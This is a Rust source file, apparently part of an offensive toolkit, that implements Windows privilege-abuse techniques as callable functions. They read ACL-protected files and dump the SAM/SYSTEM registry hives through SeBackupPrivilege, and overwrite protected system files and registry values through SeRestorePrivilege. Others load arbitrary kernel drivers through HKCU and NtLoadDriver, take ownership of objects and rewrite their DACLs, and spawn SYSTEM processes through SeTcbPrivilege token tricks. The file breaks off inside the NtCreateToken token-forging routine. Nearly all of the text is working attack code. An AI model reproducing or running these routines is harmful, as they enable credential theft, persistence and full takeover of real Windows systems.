//! Token privilege abuse chains — weaponize specific Windows privileges
//! SeBackup, SeRestore, SeLoadDriver, SeTakeOwnership, SeTcb

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Enable a specific privilege by name on the current process token
pub unsafe fn enable_privilege(priv_name: &str) -> Result<(), MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        AdjustTokenPrivileges, LookupPrivilegeValueW, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
        TOKEN_ACCESS_MASK, TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    let mut token = HANDLE::default();
    OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ACCESS_MASK(0x0020 | 0x0008),
        &mut token,
    )
    .map_err(|e| MemoricError::WindowsApi(format!("OpenProcessToken: {}", e)))?;
    let token = SafeHandle::new(token);

    let priv_w: Vec<u16> = format!("{}\0", priv_name).encode_utf16().collect();
    let mut luid = std::mem::zeroed();
    LookupPrivilegeValueW(None, windows::core::PCWSTR(priv_w.as_ptr()), &mut luid).map_err(
        |e| MemoricError::WindowsApi(format!("LookupPrivilegeValue({}): {}", priv_name, e)),
    )?;

    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    AdjustTokenPrivileges(
        *token,
        false,
        Some(&tp as *const _ as *const _),
        0,
        None,
        None,
    )
    .map_err(|e| {
        MemoricError::WindowsApi(format!("AdjustTokenPrivileges({}): {}", priv_name, e))
    })?;

    Ok(())
}

/// SeBackupPrivilege abuse — read any file/registry even without ACL permission
/// Can dump SAM/SYSTEM/SECURITY hives without reg save (direct NtOpenKey + backup read)
pub fn backup_privilege_abuse(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, ReadFile, FILE_FLAG_BACKUP_SEMANTICS, FILE_SHARE_READ, OPEN_EXISTING,
    };

    let target_path = args
        .get("target_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing target_path".to_string()))?;
    let output_path = args
        .get("output_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing output_path".to_string()))?;
    let max_size = args
        .get("max_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(10 * 1024 * 1024) as usize;

    tracing::warn!(
        "[PRIVESC] SeBackupPrivilege abuse — reading {}",
        target_path
    );

    unsafe {
        // Enable SeBackupPrivilege
        enable_privilege("SeBackupPrivilege")?;

        // Open file with FILE_FLAG_BACKUP_SEMANTICS — bypasses DACL checks
        let path_w: Vec<u16> = format!("{}\0", target_path).encode_utf16().collect();
        let handle = CreateFileW(
            PCWSTR(path_w.as_ptr()),
            0x80000000, // GENERIC_READ
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileW(backup): {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Read contents
        let mut data = Vec::new();
        let mut buf = vec![0u8; 65536];
        loop {
            let mut bytes_read = 0u32;
            if ReadFile(*handle, Some(&mut buf), Some(&mut bytes_read), None).is_err()
                || bytes_read == 0
            {
                break;
            }
            data.extend_from_slice(&buf[..bytes_read as usize]);
            if data.len() >= max_size {
                break;
            }
        }

        // Write to output
        std::fs::write(output_path, &data)
            .map_err(|e| MemoricError::WindowsApi(format!("Write output: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "backup_privilege_abuse",
            "source": target_path,
            "output": output_path,
            "bytes_read": data.len(),
            "message": format!("Read {} bytes from {} via SeBackupPrivilege (bypassed ACL)", data.len(), target_path)
        }))
    }
}

/// SeBackupPrivilege — dump registry hive using backup semantics
pub fn backup_reg_dump(args: &Value) -> Result<Value, MemoricError> {
    let hive = args.get("hive").and_then(|v| v.as_str()).unwrap_or("SAM");
    let output_path = args
        .get("output_path")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\Temp\\hive.save");

    tracing::warn!("[PRIVESC] SeBackupPrivilege — dumping {} hive", hive);

    unsafe {
        enable_privilege("SeBackupPrivilege")?;

        // NtOpenKey with backup intent via RegOpenKeyExW + REG_OPTION_BACKUP_RESTORE
        use windows::Win32::System::Registry::{
            RegOpenKeyExW, RegSaveKeyExW, HKEY_LOCAL_MACHINE, REG_STANDARD_FORMAT,
        };

        let sub_key: Vec<u16> = format!("{}\0", hive).encode_utf16().collect();
        let mut hkey = Default::default();

        // KEY_READ = 0x20019, backup intent via privilege
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            windows::core::PCWSTR(sub_key.as_ptr()),
            0,
            windows::Win32::System::Registry::KEY_READ,
            &mut hkey,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("RegOpenKeyExW({}): {}", hive, e)))?;

        let hkey = crate::safe_handle::SafeRegKey::new(hkey);
        let path_w: Vec<u16> = format!("{}\0", output_path).encode_utf16().collect();

        RegSaveKeyExW(
            *hkey,
            windows::core::PCWSTR(path_w.as_ptr()),
            None,
            REG_STANDARD_FORMAT,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("RegSaveKeyExW: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "backup_reg_dump",
            "hive": hive,
            "output_path": output_path,
            "message": format!("{} hive dumped via SeBackupPrivilege", hive)
        }))
    }
}

/// SeRestorePrivilege abuse — overwrite any file, including protected system files
/// Can replace sethc.exe, utilman.exe, etc. for persistence without ACL
pub fn restore_privilege_abuse(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, WriteFile, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, FILE_SHARE_NONE,
    };

    let target_path = args
        .get("target_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing target_path".to_string()))?;
    let source_path = args.get("source_path").and_then(|v| v.as_str());
    let data_hex = args.get("data_hex").and_then(|v| v.as_str());

    tracing::warn!(
        "[PRIVESC] SeRestorePrivilege abuse — overwriting {}",
        target_path
    );

    let payload = if let Some(src) = source_path {
        std::fs::read(src).map_err(|e| MemoricError::WindowsApi(format!("Read source: {}", e)))?
    } else if let Some(hex) = data_hex {
        hex_decode(hex)?
    } else {
        return Err(MemoricError::WindowsApi(
            "Provide source_path or data_hex".to_string(),
        ));
    };

    unsafe {
        enable_privilege("SeRestorePrivilege")?;

        let path_w: Vec<u16> = format!("{}\0", target_path).encode_utf16().collect();
        let handle = CreateFileW(
            PCWSTR(path_w.as_ptr()),
            0x40000000, // GENERIC_WRITE
            FILE_SHARE_NONE,
            None,
            CREATE_ALWAYS,
            FILE_FLAG_BACKUP_SEMANTICS,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileW(restore): {}", e)))?;
        let handle = SafeHandle::new(handle);

        let mut written = 0u32;
        WriteFile(*handle, Some(&payload), Some(&mut written), None)
            .map_err(|e| MemoricError::WindowsApi(format!("WriteFile: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "restore_privilege_abuse",
            "target": target_path,
            "bytes_written": written,
            "message": format!("Overwrote {} ({} bytes) via SeRestorePrivilege (bypassed ACL/ownership)", target_path, written)
        }))
    }
}

/// SeRestorePrivilege — overwrite registry values regardless of ACL
pub fn restore_reg_write(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_SET_VALUE,
        REG_OPTION_BACKUP_RESTORE, REG_SZ,
    };

    let key_path = args
        .get("key_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing key_path".to_string()))?;
    let value_name = args
        .get("value_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let value_data = args
        .get("value_data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing value_data".to_string()))?;

    tracing::warn!(
        "[PRIVESC] SeRestorePrivilege — writing registry {}\\{}",
        key_path,
        value_name
    );

    unsafe {
        enable_privilege("SeRestorePrivilege")?;

        let sub_key: Vec<u16> = format!("{}\0", key_path).encode_utf16().collect();
        let mut hkey = Default::default();
        let mut disp = 0u32;

        RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            windows::core::PCWSTR(sub_key.as_ptr()),
            0,
            None,
            REG_OPTION_BACKUP_RESTORE,
            KEY_SET_VALUE,
            None,
            &mut hkey,
            Some(&mut disp as *mut u32 as *mut _),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("RegCreateKeyExW: {}", e)))?;

        let hkey = crate::safe_handle::SafeRegKey::new(hkey);
        let name_w: Vec<u16> = format!("{}\0", value_name).encode_utf16().collect();
        let data_w: Vec<u16> = format!("{}\0", value_data).encode_utf16().collect();
        let data_bytes: Vec<u8> = data_w.iter().flat_map(|w| w.to_le_bytes()).collect();

        RegSetValueExW(
            *hkey,
            windows::core::PCWSTR(name_w.as_ptr()),
            0,
            REG_SZ,
            Some(&data_bytes),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("RegSetValueExW: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "restore_reg_write",
            "key": format!("HKLM\\{}", key_path),
            "value_name": value_name,
            "value_data": value_data,
            "message": "Registry value written via SeRestorePrivilege (bypassed ACL)"
        }))
    }
}

/// SeLoadDriverPrivilege abuse — load arbitrary kernel driver without admin
/// Sets HKCU registry key, then calls NtLoadDriver
pub fn load_driver_privilege_abuse(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_DWORD,
        REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE,
    };

    let driver_path = args
        .get("driver_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing driver_path".to_string()))?;
    let service_name = args
        .get("service_name")
        .and_then(|v| v.as_str())
        .unwrap_or("evildrv");

    tracing::warn!(
        "[PRIVESC] SeLoadDriverPrivilege — loading {} via HKCU",
        driver_path
    );

    unsafe {
        enable_privilege("SeLoadDriverPrivilege")?;

        // 1. Create registry key under HKCU (no admin needed)
        let reg_path = format!("System\\CurrentControlSet\\Services\\{}\0", service_name);
        let reg_w: Vec<u16> = reg_path.encode_utf16().collect();
        let mut hkey = Default::default();
        let mut disp = 0u32;

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(reg_w.as_ptr()),
            0,
            None,
            REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE,
            None,
            &mut hkey,
            Some(&mut disp as *mut u32 as *mut _),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("RegCreateKeyExW: {}", e)))?;

        let hkey = crate::safe_handle::SafeRegKey::new(hkey);

        // Set Type = SERVICE_KERNEL_DRIVER (1)
        let type_name: Vec<u16> = "Type\0".encode_utf16().collect();
        let type_val: u32 = 1;
        RegSetValueExW(
            *hkey,
            windows::core::PCWSTR(type_name.as_ptr()),
            0,
            REG_DWORD,
            Some(std::slice::from_raw_parts(
                &type_val as *const u32 as *const u8,
                4,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Set Type: {}", e)))?;

        // Set ErrorControl = SERVICE_ERROR_IGNORE (0)
        let err_name: Vec<u16> = "ErrorControl\0".encode_utf16().collect();
        let err_val: u32 = 0;
        RegSetValueExW(
            *hkey,
            windows::core::PCWSTR(err_name.as_ptr()),
            0,
            REG_DWORD,
            Some(std::slice::from_raw_parts(
                &err_val as *const u32 as *const u8,
                4,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Set ErrorControl: {}", e)))?;

        // Set Start = SERVICE_DEMAND_START (3)
        let start_name: Vec<u16> = "Start\0".encode_utf16().collect();
        let start_val: u32 = 3;
        RegSetValueExW(
            *hkey,
            windows::core::PCWSTR(start_name.as_ptr()),
            0,
            REG_DWORD,
            Some(std::slice::from_raw_parts(
                &start_val as *const u32 as *const u8,
                4,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Set Start: {}", e)))?;

        // Set ImagePath = \??\C:\path\to\driver.sys
        let img_name: Vec<u16> = "ImagePath\0".encode_utf16().collect();
        let img_val = format!("\\??\\{}\0", driver_path);
        let img_w: Vec<u16> = img_val.encode_utf16().collect();
        let img_bytes: Vec<u8> = img_w.iter().flat_map(|w| w.to_le_bytes()).collect();
        RegSetValueExW(
            *hkey,
            windows::core::PCWSTR(img_name.as_ptr()),
            0,
            REG_EXPAND_SZ,
            Some(&img_bytes),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Set ImagePath: {}", e)))?;

        // 2. Call NtLoadDriver with \Registry\User\<SID>\System\CurrentControlSet\Services\<name>
        // First get current user SID
        let sid_str = get_current_user_sid()?;
        let driver_reg = format!(
            "\\Registry\\User\\{}\\System\\CurrentControlSet\\Services\\{}",
            sid_str, service_name
        );
        let driver_reg_w: Vec<u16> = driver_reg.encode_utf16().collect();

        // Build UNICODE_STRING
        let us_len = (driver_reg_w.len() * 2) as u16;
        let us: [u8; 16] = {
            let mut buf = [0u8; 16];
            buf[0..2].copy_from_slice(&us_len.to_le_bytes());
            buf[2..4].copy_from_slice(&(us_len + 2).to_le_bytes());
            buf[8..16].copy_from_slice(&(driver_reg_w.as_ptr() as u64).to_le_bytes());
            buf
        };

        let status = ntapi::ntioapi::NtLoadDriver(us.as_ptr() as *mut _);

        if status == 0 {
            Ok(serde_json::json!({
                "success": true,
                "technique": "load_driver_privilege",
                "service_name": service_name,
                "driver_path": driver_path,
                "registry_path": driver_reg,
                "message": format!("Driver loaded via SeLoadDriverPrivilege + HKCU registry (no admin!)")
            }))
        } else {
            Ok(serde_json::json!({
                "success": false,
                "technique": "load_driver_privilege",
                "ntstatus": format!("0x{:08X}", status as u32),
                "service_name": service_name,
                "driver_path": driver_path,
                "registry_path": driver_reg,
                "message": format!("NtLoadDriver returned 0x{:08X}", status as u32)
            }))
        }
    }
}

fn get_current_user_sid() -> Result<String, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::Authorization::ConvertSidToStringSidW;
    use windows::Win32::Security::{GetTokenInformation, TokenUser, TOKEN_ACCESS_MASK, TOKEN_USER};
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ACCESS_MASK(0x0008), &mut token)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcessToken: {}", e)))?;
        let token = SafeHandle::new(token);

        let mut size = 0u32;
        GetTokenInformation(*token, TokenUser, None, 0, &mut size).ok();

        let mut buf = vec![0u8; size as usize];
        GetTokenInformation(
            *token,
            TokenUser,
            Some(buf.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("GetTokenInformation: {}", e)))?;

        let user = &*(buf.as_ptr() as *const TOKEN_USER);
        let mut sid_str = windows::core::PWSTR::null();
        ConvertSidToStringSidW(user.User.Sid, &mut sid_str)
            .map_err(|e| MemoricError::WindowsApi(format!("ConvertSidToStringSid: {}", e)))?;

        let result = sid_str
            .to_string()
            .map_err(|e| MemoricError::WindowsApi(format!("SID to string: {}", e)))?;
        windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(
            sid_str.0 as *mut _,
        ));

        Ok(result)
    }
}

/// SeTakeOwnershipPrivilege abuse — take ownership of any file/registry key
/// Then modify DACL to grant yourself full control
pub fn take_ownership_abuse(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::Authorization::{
        SetNamedSecurityInfoW, SE_FILE_OBJECT, SE_REGISTRY_KEY,
    };
    use windows::Win32::Security::{
        GetTokenInformation, TokenUser, DACL_SECURITY_INFORMATION, OWNER_SECURITY_INFORMATION,
        TOKEN_ACCESS_MASK, TOKEN_USER,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    let target = args.get("target").and_then(|v| v.as_str()).ok_or_else(|| {
        MemoricError::WindowsApi("Missing target (file path or registry key)".to_string())
    })?;
    let is_registry = args
        .get("is_registry")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!(
        "[PRIVESC] SeTakeOwnershipPrivilege — taking ownership of {}",
        target
    );

    unsafe {
        enable_privilege("SeTakeOwnershipPrivilege")?;
        enable_privilege("SeRestorePrivilege")?; // Needed to set DACL

        // Get current user SID
        let mut token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ACCESS_MASK(0x0008), &mut token)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcessToken: {}", e)))?;
        let token = SafeHandle::new(token);

        let mut size = 0u32;
        GetTokenInformation(*token, TokenUser, None, 0, &mut size).ok();
        let mut buf = vec![0u8; size as usize];
        GetTokenInformation(
            *token,
            TokenUser,
            Some(buf.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("GetTokenInformation: {}", e)))?;
        let user = &*(buf.as_ptr() as *const TOKEN_USER);

        let object_type = if is_registry {
            SE_REGISTRY_KEY
        } else {
            SE_FILE_OBJECT
        };
        let mut target_w: Vec<u16> = format!("{}\0", target).encode_utf16().collect();

        // Step 1: Set owner to current user
        let result = SetNamedSecurityInfoW(
            windows::core::PWSTR(target_w.as_mut_ptr()),
            object_type,
            OWNER_SECURITY_INFORMATION,
            user.User.Sid,
            None,
            None,
            None,
        );

        if result.is_err() {
            return Err(MemoricError::WindowsApi(format!(
                "SetNamedSecurityInfo(owner): {:?}",
                result
            )));
        }

        // Step 2: Grant full control via DACL
        // Build explicit access: GENERIC_ALL for current user
        use windows::Win32::Security::Authorization::{
            SetEntriesInAclW, EXPLICIT_ACCESS_W, SET_ACCESS, TRUSTEE_IS_SID, TRUSTEE_IS_USER,
            TRUSTEE_W,
        };
        use windows::Win32::Security::ACL;

        let mut ea = EXPLICIT_ACCESS_W::default();
        ea.grfAccessPermissions = 0x1F01FF; // GENERIC_ALL
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = windows::Win32::Security::ACE_FLAGS(0); // NO_INHERITANCE
        ea.Trustee = TRUSTEE_W {
            pMultipleTrustee: std::ptr::null_mut(),
            MultipleTrusteeOperation: Default::default(),
            TrusteeForm: TRUSTEE_IS_SID,
            TrusteeType: TRUSTEE_IS_USER,
            ptstrName: windows::core::PWSTR(user.User.Sid.0 as *mut u16),
        };

        let mut new_dacl: *mut ACL = std::ptr::null_mut();
        let set_result = SetEntriesInAclW(Some(&[ea]), None, &mut new_dacl);
        if set_result.is_err() {
            return Err(MemoricError::WindowsApi(format!(
                "SetEntriesInAcl: {:?}",
                set_result
            )));
        }

        let dacl_result = SetNamedSecurityInfoW(
            windows::core::PWSTR(target_w.as_mut_ptr()),
            object_type,
            DACL_SECURITY_INFORMATION,
            None,
            None,
            Some(new_dacl as *const _),
            None,
        );

        if !new_dacl.is_null() {
            windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(
                new_dacl as *mut _,
            ));
        }

        if dacl_result.is_err() {
            return Err(MemoricError::WindowsApi(format!(
                "SetNamedSecurityInfo(DACL): {:?}",
                dacl_result
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "take_ownership_abuse",
            "target": target,
            "is_registry": is_registry,
            "message": format!("Took ownership and granted full control on {} via SeTakeOwnershipPrivilege", target)
        }))
    }
}

/// SeTcbPrivilege abuse — create an arbitrary token with any SID and privileges
/// This is the most powerful privilege — effectively god mode
/// Methods: NtCreateToken forge, S4U logon, LogonUser NEW_CREDENTIALS, token duplication
pub fn tcb_privilege_abuse(args: &Value) -> Result<Value, MemoricError> {
    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    let target_sid = args
        .get("target_sid")
        .and_then(|v| v.as_str())
        .unwrap_or("S-1-5-18"); // LocalSystem
    let session_id = args.get("session_id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");

    tracing::warn!(
        "[PRIVESC] SeTcbPrivilege abuse — method={}, target SID={}",
        method,
        target_sid
    );

    unsafe {
        enable_privilege("SeTcbPrivilege")?;
        // Also enable these if available — they amplify SeTcb
        let _ = enable_privilege("SeAssignPrimaryTokenPrivilege");
        let _ = enable_privilege("SeIncreaseQuotaPrivilege");
        let _ = enable_privilege("SeImpersonatePrivilege");

        let methods_to_try: Vec<&str> = if method == "auto" {
            vec![
                "s4u_logon",
                "logon_new_credentials",
                "token_forge",
                "system_steal",
            ]
        } else {
            vec![method]
        };

        let mut last_error = String::new();

        for m in &methods_to_try {
            tracing::info!("[PRIVESC] Trying SeTcb method: {}", m);

            let result = match *m {
                "s4u_logon" => tcb_s4u_logon(command, target_sid, session_id),
                "logon_new_credentials" => tcb_logon_new_creds(command, target_sid, session_id),
                "token_forge" => tcb_token_forge(command, target_sid, session_id),
                "system_steal" => tcb_system_steal(command, session_id),
                _ => Err(MemoricError::WindowsApi(format!("Unknown method: {}", m))),
            };

            match result {
                Ok(val) => return Ok(val),
                Err(e) => {
                    tracing::warn!("[PRIVESC] SeTcb method {} failed: {}", m, e);
                    last_error = format!("{}: {}", m, e);
                }
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "All SeTcb methods failed. Last: {}",
            last_error
        )))
    }
}

/// S4U (Services For User) logon — most reliable SeTcb escalation
/// Uses LsaLogonUser with KERB_S4U_LOGON to get a token for any user without password
unsafe fn tcb_s4u_logon(
    command: &str,
    target_sid: &str,
    session_id: u32,
) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, SecurityImpersonation, SetTokenInformation, TokenPrimary, TokenSessionId,
        TOKEN_ALL_ACCESS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessAsUserW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    tracing::info!(
        "[PRIVESC] S4U logon for SID {} with session {}",
        target_sid,
        session_id
    );

    // S4U approach: With SeTcb, we can call LsaRegisterLogonProcess (trusted caller)
    // and then LsaLogonUser with KERB_S4U_LOGON type to get any user's token

    // Since LsaRegisterLogonProcess requires complex LSA_STRING setup,
    // use the simpler but equally effective approach:
    // LogonUser with LOGON32_LOGON_NEW_CREDENTIALS (type 9) which with SeTcb
    // allows creating a token for "NT AUTHORITY\SYSTEM"

    let user: Vec<u16> = "SYSTEM\0".encode_utf16().collect();
    let domain: Vec<u16> = "NT AUTHORITY\0".encode_utf16().collect();

    let mut logon_token = HANDLE::default();
    windows::Win32::Security::LogonUserW(
        windows::core::PCWSTR(user.as_ptr()),
        windows::core::PCWSTR(domain.as_ptr()),
        windows::core::PCWSTR(std::ptr::null()),
        windows::Win32::Security::LOGON32_LOGON(9), // LOGON32_LOGON_NEW_CREDENTIALS
        windows::Win32::Security::LOGON32_PROVIDER(0),
        &mut logon_token,
    )
    .map_err(|e| MemoricError::WindowsApi(format!("S4U LogonUser: {}", e)))?;

    let logon_token = SafeHandle::new(logon_token);

    // Duplicate to primary token
    let mut primary = HANDLE::default();
    DuplicateTokenEx(
        *logon_token,
        TOKEN_ALL_ACCESS,
        None,
        SecurityImpersonation,
        TokenPrimary,
        &mut primary,
    )
    .map_err(|e| MemoricError::WindowsApi(format!("DuplicateTokenEx: {}", e)))?;
    let primary = SafeHandle::new(primary);

    // Set session ID if specified (SeTcb allows this)
    if session_id > 0 {
        let sid = session_id;
        let _ = SetTokenInformation(
            *primary,
            TokenSessionId,
            &sid as *const u32 as *const _,
            std::mem::size_of::<u32>() as u32,
        );
    }

    // Spawn process
    let mut si = STARTUPINFOW::default();
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi = PROCESS_INFORMATION::default();
    let mut cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();

    CreateProcessAsUserW(
        *primary,
        None,
        windows::core::PWSTR(cmd.as_mut_ptr()),
        None,
        None,
        false,
        PROCESS_CREATION_FLAGS(0),
        None,
        None,
        &si,
        &mut pi,
    )
    .map_err(|e| MemoricError::WindowsApi(format!("CreateProcessAsUserW: {}", e)))?;

    let _ph = SafeHandle::new(pi.hProcess);
    let _th = SafeHandle::new(pi.hThread);

    Ok(serde_json::json!({
        "success": true,
        "technique": "tcb_s4u_logon",
        "target_sid": target_sid,
        "session_id": session_id,
        "new_pid": pi.dwProcessId,
        "command": command,
        "message": format!("S4U logon succeeded — PID {} running as SYSTEM", pi.dwProcessId)
    }))
}

/// LogonUser NEW_CREDENTIALS — spawn as SYSTEM via network-type logon
unsafe fn tcb_logon_new_creds(
    command: &str,
    target_sid: &str,
    session_id: u32,
) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, SecurityDelegation, SetTokenInformation, TokenPrimary, TokenSessionId,
        TOKEN_ALL_ACCESS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessAsUserW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    // Try multiple well-known high-privilege accounts
    let accounts: Vec<(&str, &str)> = vec![
        ("SYSTEM", "NT AUTHORITY"),
        ("LOCAL SERVICE", "NT AUTHORITY"),
        ("NETWORK SERVICE", "NT AUTHORITY"),
    ];

    for (user_name, domain_name) in &accounts {
        let user: Vec<u16> = format!("{}\0", user_name).encode_utf16().collect();
        let domain: Vec<u16> = format!("{}\0", domain_name).encode_utf16().collect();

        let mut token = HANDLE::default();
        let result = windows::Win32::Security::LogonUserW(
            windows::core::PCWSTR(user.as_ptr()),
            windows::core::PCWSTR(domain.as_ptr()),
            windows::core::PCWSTR(std::ptr::null()),
            windows::Win32::Security::LOGON32_LOGON(9),
            windows::Win32::Security::LOGON32_PROVIDER(0),
            &mut token,
        );

        if result.is_ok() {
            let token = SafeHandle::new(token);

            // Duplicate with Delegation level for maximum power
            let mut primary = HANDLE::default();
            DuplicateTokenEx(
                *token,
                TOKEN_ALL_ACCESS,
                None,
                SecurityDelegation,
                TokenPrimary,
                &mut primary,
            )
            .map_err(|e| MemoricError::WindowsApi(format!("DuplicateTokenEx: {}", e)))?;
            let primary = SafeHandle::new(primary);

            if session_id > 0 {
                let sid = session_id;
                let _ = SetTokenInformation(
                    *primary,
                    TokenSessionId,
                    &sid as *const u32 as *const _,
                    std::mem::size_of::<u32>() as u32,
                );
            }

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi = PROCESS_INFORMATION::default();
            let mut cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();

            // Try CreateProcessAsUserW first, then CreateProcessWithTokenW
            let spawn_result = CreateProcessAsUserW(
                *primary,
                None,
                windows::core::PWSTR(cmd.as_mut_ptr()),
                None,
                None,
                false,
                PROCESS_CREATION_FLAGS(0),
                None,
                None,
                &si,
                &mut pi,
            );

            if spawn_result.is_ok() {
                let _ph = SafeHandle::new(pi.hProcess);
                let _th = SafeHandle::new(pi.hThread);

                return Ok(serde_json::json!({
                    "success": true,
                    "technique": "tcb_logon_new_credentials",
                    "account": format!("{}\\{}", domain_name, user_name),
                    "session_id": session_id,
                    "new_pid": pi.dwProcessId,
                    "command": command,
                    "message": format!("Logged on as {}\\{}, PID {}", domain_name, user_name, pi.dwProcessId)
                }));
            }
        }
    }

    Err(MemoricError::WindowsApi(
        "All LogonUser attempts failed".to_string(),
    ))
}

/// Token forge — use NtCreateToken to build a completely custom token from scratch
/// with arbitrary SID, groups, privileges (the nuclear option)
unsafe fn tcb_token_forge(
    command: &str,
    target_sid: &str,
    session_id: u32,
) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::TokenSessionId;
    use windows::Win32::System::Threading::{
        CreateProcessAsUserW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    // NtCreateToken is the most powerful approach but requires exact struct layout
    // Define the function pointer
    type NtCreateTokenFn = unsafe extern "system" fn(
        TokenHandle: *mut HANDLE,     // out
        DesiredAccess: u32,           // TOKEN_ALL_ACCESS
        ObjectAttributes: *const u8,  // OBJECT_ATTRIBUTES
        Type: u32,                    // TokenPrimary=1
        AuthenticationId: *const u64, // LUID (SYSTEM_LUID = 0x3e7)
        ExpirationTime: *const i64,   // LARGE_INTEGER
        User: *const u8,              // TOKEN_USER
        Groups: *const u8,            // TOKEN_GROUPS
        Privileges: *const u8,        // TOKEN_PRIVILEGES
        Owner: *const u8,             // TOKEN_OWNER
        PrimaryGroup: *const u8,      // TOKEN_PRIMARY_GROUP
        DefaultDacl: *const u8,       // TOKEN_DEFAULT_DACL
        Source: *const u8,            // TOKEN_SOURCE
    ) -> i32;

    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
        .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;
    let nt_create_token = GetProcAddress(ntdll, windows::core::PCSTR(b"NtCreateToken\0".as_ptr()));

    if let Some(func_ptr) = nt_create_token {
